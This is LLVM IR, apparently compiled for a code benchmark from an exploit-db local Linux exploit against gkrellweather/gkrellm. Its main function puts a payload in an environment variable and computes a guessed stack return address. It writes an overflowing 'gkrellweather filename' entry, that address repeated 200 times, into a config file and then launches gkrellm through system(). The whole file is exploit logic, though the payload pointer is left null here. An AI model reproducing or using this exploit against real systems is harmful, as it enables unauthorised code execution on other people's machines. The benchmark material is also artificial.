; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_31151.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_31151.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@payload = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [19 x i8] c"./gkrellweather2sh\00", align 1
@CONFIG_PATH = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@O_APPEND = common dso_local global i32 0, align 4
@EXIT_FAILURE = common dso_local global i32 0, align 4
@ENV_NAME = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [4 x i8] c"%lx\00", align 1
@.str.2 = private unnamed_addr constant [24 x i8] c"gkrellweather filename \00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"gkrellm\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [9 x i8], align 1
  %3 = alloca [4 x i8], align 1
  %4 = alloca i8, align 1
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %9 = load i8*, i8** @payload, align 8
  %10 = call i32 @strlen(i8* %9)
  %11 = sub i32 -1073741830, %10
  %12 = call i32 @strlen(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  %13 = sub i32 %11, %12
  %14 = zext i32 %13 to i64
  store i64 %14, i64* %5, align 8
  %15 = load i32, i32* @CONFIG_PATH, align 4
  %16 = load i32, i32* @O_WRONLY, align 4
  %17 = load i32, i32* @O_APPEND, align 4
  %18 = or i32 %16, %17
  %19 = call i32 @open(i32 %15, i32 %18)
  store i32 %19, i32* %8, align 4
  %20 = load i32, i32* %8, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %24

22:                                               ; preds = %0
  %23 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %23, i32* %1, align 4
  br label %124

24:                                               ; preds = %0
  %25 = load i32, i32* @ENV_NAME, align 4
  %26 = load i8*, i8** @payload, align 8
  %27 = call i64 @setenv(i32 %25, i8* %26, i32 1)
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %29, label %31

29:                                               ; preds = %24
  %30 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %30, i32* %1, align 4
  br label %124

31:                                               ; preds = %24
  %32 = getelementptr inbounds [9 x i8], [9 x i8]* %2, i64 0, i64 0
  %33 = load i64, i64* %5, align 8
  %34 = call i32 @snprintf(i8* %32, i32 9, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i64 %33)
  store i32 7, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %35

35:                                               ; preds = %93, %31
  %36 = load i32, i32* %7, align 4
  %37 = icmp slt i32 %36, 4
  br i1 %37, label %38, label %106

38:                                               ; preds = %35
  %39 = load i32, i32* %6, align 4
  %40 = sub nsw i32 %39, 1
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [9 x i8], [9 x i8]* %2, i64 0, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp sge i32 %44, 97
  br i1 %45, label %46, label %56

46:                                               ; preds = %38
  %47 = load i32, i32* %6, align 4
  %48 = sub nsw i32 %47, 1
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds [9 x i8], [9 x i8]* %2, i64 0, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = and i32 %52, 223
  %54 = sub nsw i32 %53, 65
  %55 = add nsw i32 %54, 10
  br label %64

56:                                               ; preds = %38
  %57 = load i32, i32* %6, align 4
  %58 = sub nsw i32 %57, 1
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds [9 x i8], [9 x i8]* %2, i64 0, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = sext i8 %61 to i32
  %63 = sub nsw i32 %62, 48
  br label %64

64:                                               ; preds = %56, %46
  %65 = phi i32 [ %55, %46 ], [ %63, %56 ]
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %4, align 1
  %67 = load i8, i8* %4, align 1
  %68 = sext i8 %67 to i32
  %69 = shl i32 %68, 4
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %4, align 1
  %71 = load i32, i32* %6, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [9 x i8], [9 x i8]* %2, i64 0, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = sext i8 %74 to i32
  %76 = icmp sge i32 %75, 97
  br i1 %76, label %77, label %86

77:                                               ; preds = %64
  %78 = load i32, i32* %6, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [9 x i8], [9 x i8]* %2, i64 0, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = sext i8 %81 to i32
  %83 = and i32 %82, 223
  %84 = sub nsw i32 %83, 65
  %85 = add nsw i32 %84, 10
  br label %93

86:                                               ; preds = %64
  %87 = load i32, i32* %6, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds [9 x i8], [9 x i8]* %2, i64 0, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = sub nsw i32 %91, 48
  br label %93

93:                                               ; preds = %86, %77
  %94 = phi i32 [ %85, %77 ], [ %92, %86 ]
  %95 = load i8, i8* %4, align 1
  %96 = sext i8 %95 to i32
  %97 = add nsw i32 %96, %94
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %4, align 1
  %99 = load i8, i8* %4, align 1
  %100 = load i32, i32* %7, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %7, align 4
  %102 = sext i32 %100 to i64
  %103 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 %102
  store i8 %99, i8* %103, align 1
  %104 = load i32, i32* %6, align 4
  %105 = sub nsw i32 %104, 2
  store i32 %105, i32* %6, align 4
  br label %35

106:                                              ; preds = %35
  %107 = load i32, i32* %8, align 4
  %108 = call i32 @write(i32 %107, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i32 23)
  store i32 0, i32* %6, align 4
  br label %109

109:                                              ; preds = %116, %106
  %110 = load i32, i32* %6, align 4
  %111 = icmp slt i32 %110, 200
  br i1 %111, label %112, label %119

112:                                              ; preds = %109
  %113 = load i32, i32* %8, align 4
  %114 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  %115 = call i32 @write(i32 %113, i8* %114, i32 4)
  br label %116

116:                                              ; preds = %112
  %117 = load i32, i32* %6, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %6, align 4
  br label %109

119:                                              ; preds = %109
  %120 = load i32, i32* %8, align 4
  %121 = call i32 @close(i32 %120)
  %122 = call i32 @system(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %123 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %123, i32* %1, align 4
  br label %124

124:                                              ; preds = %119, %29, %22
  %125 = load i32, i32* %1, align 4
  ret i32 %125
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @open(i32, i32) #1

declare dso_local i64 @setenv(i32, i8*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i64) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
